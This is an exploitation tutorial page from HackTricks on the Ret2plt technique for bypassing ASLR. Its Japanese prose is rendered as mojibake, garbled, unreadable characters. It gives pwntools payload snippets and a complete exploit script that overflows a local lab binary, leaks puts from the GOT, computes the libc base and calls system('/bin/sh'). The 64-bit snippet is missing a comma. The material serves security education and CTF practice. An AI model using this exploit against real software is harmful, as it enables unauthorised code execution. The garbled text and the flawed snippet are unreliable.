# Ret2plt

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦**ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

ã“ã®æŠ€è¡“ã®ç›®æ¨™ã¯ã€ASLRã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«PLTã‹ã‚‰é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’**ãƒªãƒ¼ã‚¯**ã™ã‚‹ã“ã¨ã§ã™ã€‚ãŸã¨ãˆã°ã€libcã‹ã‚‰`puts`é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã™ã‚‹ã¨ã€**`libc`ã®ãƒ™ãƒ¼ã‚¹ã‚’è¨ˆç®—**ã—ã€**`system`**ãªã©ã®ä»–ã®é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¨ˆç®—ã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€`pwntools`ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼ˆ[**ã“ã¡ã‚‰ã‹ã‚‰**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)ï¼‰ã€‚
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**`puts`**ï¼ˆPLTã‹ã‚‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ï¼‰ãŒã€GOTï¼ˆGlobal Offset Tableï¼‰ã«ã‚ã‚‹`puts`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§å‘¼ã³å‡ºã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€`puts`ãŒ`puts`ã®GOTã‚¨ãƒ³ãƒˆãƒªã‚’å‡ºåŠ›ã™ã‚‹æ™‚ç‚¹ã§ã€ã“ã®**ã‚¨ãƒ³ãƒˆãƒªã«ã¯ãƒ¡ãƒ¢ãƒªå†…ã®`puts`ã®æ­£ç¢ºãªã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå«ã¾ã‚Œã¦ã„ã‚‹**ãŸã‚ã§ã™ã€‚

ã¾ãŸã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã§`main`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ãŸãŒã£ã¦ã€`puts`ãŒå®Ÿè¡Œã‚’çµ‚äº†ã™ã‚‹ã¨ã€**ãƒã‚¤ãƒŠãƒªã¯çµ‚äº†ã™ã‚‹ä»£ã‚ã‚Šã«å†ã³`main`ã‚’å‘¼ã³å‡ºã—ã¾ã™**ï¼ˆã—ãŸãŒã£ã¦ã€æ¼æ´©ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã¯å¼•ãç¶šãæœ‰åŠ¹ã§ã™ï¼‰ã€‚

{% hint style="danger" %}
ã“ã‚ŒãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€ãƒã‚¤ãƒŠãƒªãŒ**PIEã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ã„ãªã„**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã¯ã€PIEã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã®**ãƒªãƒ¼ã‚¯ã‚’è¦‹ã¤ã‘ã¦ã„ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã†ã§ãªã„å ´åˆã¯ã€ã¾ãšPIEã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

[**ã“ã¡ã‚‰ã§ã“ã®ãƒã‚¤ãƒ‘ã‚¹ã®å®Œå…¨ãªä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ãã®**ä¾‹ã‹ã‚‰ã®æœ€çµ‚çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ**ã§ã—ãŸã€‚
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## ãã®ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64ãƒ“ãƒƒãƒˆã€ASLRæœ‰åŠ¹ã€ãŸã ã—PIEãªã—ã€æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€canaryã®ãƒã‚¤ãƒˆ0x00ã¾ã§ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’åŸ‹ã‚ã¦ã‹ã‚‰putsã‚’å‘¼ã³å‡ºã—ã¦ãƒªãƒ¼ã‚¯ã•ã›ã‚‹ã“ã¨ã§ã™ã€‚canaryã‚’ä½¿ç”¨ã—ã¦ã€putsã‚’å‘¼ã³å‡ºã—ã¦GOTã‹ã‚‰putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã•ã›ã€`system('/bin/sh')`ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒä½œæˆã•ã‚Œã¾ã™ã€‚
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64ãƒ“ãƒƒãƒˆã€ASLRæœ‰åŠ¹ã€canaryãªã—ã€ãƒ¡ã‚¤ãƒ³é–¢æ•°å†…ã®ã‚¹ã‚¿ãƒƒã‚¯ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã€putsã‚’å‘¼ã³å‡ºã—ã¦GOTã‹ã‚‰putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã•ã›ã€ãã®å¾Œã«one gadgetã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã€‚
